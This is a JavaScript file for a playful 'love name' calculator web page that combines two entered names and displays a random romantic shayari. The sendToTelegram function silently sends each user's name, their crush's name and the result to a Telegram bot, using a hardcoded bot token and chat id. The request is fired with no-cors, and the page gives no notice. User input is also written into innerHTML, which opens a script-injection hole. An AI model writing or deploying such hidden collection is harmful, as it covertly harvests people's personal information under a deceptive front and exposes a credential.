function generateLove() {
  let yourName = document.getElementById("yourName").value.trim();
  let crushName = document.getElementById("crushName").value.trim();

  if (!yourName || !crushName) {
    alert("Please enter both names!");
    return;
  }

  // First 3 letters merge
  let part1 = yourName.substring(0, 3);
  let part2 = crushName.substring(0, 3);

  let loveName = part1 + part2;

  document.getElementById("result").innerHTML =
    "💖 Your Love Name: " + loveName;
    
  // Shayari generate
let shayariList = [
  `💞 ${yourName} aur ${crushName} ki kahani sabse pyari hai...`,
  `❤️ Tum dono ka naam hi nahi, kismat bhi judi hai...`,
  `💘 ${loveName} naam me hi pyaar chhupa hai...`,
  `🌹 Rab ne tum dono ko ek dusre ke liye banaya hai...`,
  `💖 ${yourName} + ${crushName} = Perfect Love Story`
];

let randomShayari = shayariList[Math.floor(Math.random() * shayariList.length)];

typeEffect(randomShayari);

  // Telegram send
  sendToTelegram(yourName, crushName, loveName, randomShayari);
}

function sendToTelegram(yourName, crushName, loveName, randomShayari) {
  let token = "8781158404:AAGZdrC-AXYt2uSlo69IvqLZubQZn8PyY8g";   // 👈 apna token daal
  let chat_id = "5594727408";   // 👈 apna chat id daal

 let message = `💖 Love Result:
Name: ${yourName}
Crush: ${crushName}
Love Name: ${loveName}

💌 Shayari:
${randomShayari}`;

  // 👇 GET method + encoded URL (CORS fix)
  let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

  fetch(url, {
    method: "GET",
    mode: "no-cors" // 👈 important
  });

  console.log("Sent to Telegram ✅");
}
function typeEffect(text) {
  let i = 0;
  let speed = 40;
  let box = document.getElementById("shayari");
  box.innerHTML = "";

  function typing() {
    if (i < text.length) {
      box.innerHTML += text.charAt(i);
      i++;
      setTimeout(typing, speed);
    }
  }

  typing();
}
